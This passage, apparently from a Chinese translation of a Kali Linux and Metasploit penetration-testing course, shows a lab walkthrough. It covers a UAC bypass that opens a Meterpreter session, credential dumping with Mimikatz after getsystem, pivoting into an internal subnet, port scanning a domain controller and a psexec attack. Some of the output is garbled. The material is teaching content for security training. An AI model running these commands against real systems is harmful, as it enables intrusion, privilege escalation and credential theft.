
- [+] UAC 已设为默认值。

- [+] ByUAC 可以绕过此设置，继续...

- [+] 正在创建文件夹...

- [+] 正在将 DLL 上传到文件系统...

- [+] 启动带有 Windows 发布证书的进程以注入...

- [+] 成功在进程中注入负载: 5800

- [+] 向 10.11.0.22 发送阶段 (179779)

- [+] Meterpreter 会话 11 打开 (10.11.0.4:4444 -> 10.11.0.22:53870)

```
meterpreter >
```

> 列表 800 - 使用 meterpreter 会话执行 UAC 绕过

除了能够后台活动会话并通过它执行模块外，我们还可以使用 `load` 命令直接在活动会话内部加载扩展。

其中一个很好的例子是 PowerShell 扩展，⁷¹²，它允许使用 PowerShell。通过此模块，我们可以执行 PowerShell 命令和脚本，或者启动交互式 PowerShell 命令。在列表 801 中，我们加载了 `powershell` 并列出了可子命令。

```
meterpreter > load powershell
Loading extension powershell...Success.
```

⁷¹²(Carlos Perez, 2016), https://www.darkoper.com/blog/2016/4/2/meterpreter-new-windows-powershell-extension

# 使用 Kali Linux 进行渗透测试 2.0

```
meterpreter > help powershell
```

PowerShell 命令

====

| Command | Description |
| --- | --- |
| powershell_execute | 执行 PowerShell 命令字符串 |
| powershell_import | 导入 PS 脚本或 .NET 程序集 DLL |
| powershell_shell | 创建交互式 PowerShell 提示符 |

例如，让我们使用 `powershell_execute` 命令通过 `$PSVersionTable.PSVersion` 全局变量来获取 PowerShell 版本。

```
meterpreter > powershell_execute "$PSVersionTable.PSVersion"
[+] Command execution completed:
```

| Major | Minor | Build | Revision |
| --- | --- | --- | --- |
| 5 | 1 | 16299 | 248 |

> meterpreter > 列表 802 - 执行 PowerShell 命令

Mimikatz 同样非常有用且幸运，它是一个扩展的实现。在这个示例中，我们将使用 `load kiwi` 运行该扩展。由于 Mimikatz 需要 SYSTEM 权限，我们将运行 `getsystem` 以从我们当前的高完整性 shell（在攻击者的上下文中）自动获取 SYSTEM 权限。最后，我们将使用 `creds_msv` 导出系统凭据：

```
meterpreter > load kiwi
Loading extension kiwi...
```

Success.

```
meterpreter > getsystem
```

...got system technique 1 (Named Pipe/Memory)).

```
meterpreter > creds_msv
[+] Running as SYSTEM
[+] Retrieving credentials
====

| Username | Domain | SHA1 |
| --- | --- | --- |
| CLIENT$ | corp | NTLM 4d4ae0e7cb61dc4fe6941ab3d80ed45264396231ca74ac2dff7580 |
| abdf154 | e2b475c11da2a784290d8a996c3277f430e84acb10eead38d6401 | 6400d2e16c264a7b63c4e67bbef4ae |

Security Ltd. All rights reserved.

# 使用 Kali Linux 2.0 进行渗透

## 2.5 使用 Metasploit Framework 进行渗透

在渗透目标后，我们可以从系统渗透到额外的目标。在 MSF 内进行渗透很方便，但缺乏手动灵活性。例如，让我们利用现有的 Meterpreter 会话枚举内部网络并渗透到其他机器。首先，我们注意到被渗透的客户端有两个接口：

```
C:\Users\offsec>ipconfig

Windows IP Configuration

Ethernet adapter Ethernet1:

    Connection-specific Suffix   . . . : fe80::49e9:5c0:6600

    Link-local IPv6 Address . . . . . . : fe80::49e9:5c0:6600

    IPv4 Address . . . . . . . . : 192.168.1.11

    Subnet Mask . . . . . . . . . . . . . : 255.255.255.0

    Default Gateway . . . . . . . . . . . . . : 192.168.1

Ethernet adapter Ethernet0:

    Connection-specific Suffix   . . . : 10.11.0.22

    IPv4 Address . . . . . . . . . . . . . . : 10.11.0.22

    Subnet Mask . . . . . . . . . . . . . . . . : 255.255.255.0

    Default Gateway . . . . . . . . . . . . . . : 10.11.0.2

C:\Users\offsec>
```

## 列表 804 - 被渗透客户端上的双接口

我们将使用 `route` 和 `add` 为发现的备用内网创建路径。我们还将指定该路由适用于会话 ID。

```
msf5 > route add 192.168.1.0/24 11
[*] Route added

msf5 > route print

IPv4 Active Routing Table

=========================

Subnet          Netmask          Gateway

-------------  ----------  -------

192.168.1.0     255.255.255.0
```

## 列表 805 - 添加新路由

有了内部路径，我们可以枚举此子网。由于我们已经知道了域控制器的 IP 地址，我们将使用 `portscan/tcp` 模块对其进行有限端口扫描。

```
msf5 > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.110
RHOSTS => 192.168.1.110
msf5 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
PORTS => 445,3389
msf5 auxiliary(scanner/portscan/tcp) > run
msf5 192.168.1.110:
[+] 192.168.1.110:3389 - TCP OPEN
[+] 192.168.1.110:445 - TCP OPEN
[+] 192.168.1.110 - Scanned 1 of 1 hosts (100% complete)
[+] Auxiliary module execution completed
msf5 auxiliary(scanner/portscan/tcp) >
```

## 列表 806 - 对内部 IP 地址进行端口扫描

由于我们之前明智地验证了域控制器的管理员凭据，现在我们尝试通过 `smb/psexec` 模块渗透域控制器。我们需要通过如下所示设置 `SMBDomain`、`SMBUser` 和 `SMBPass` 的值来指定凭据。

```
msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > set SMBDomain corp
SMBDomain => corp
```
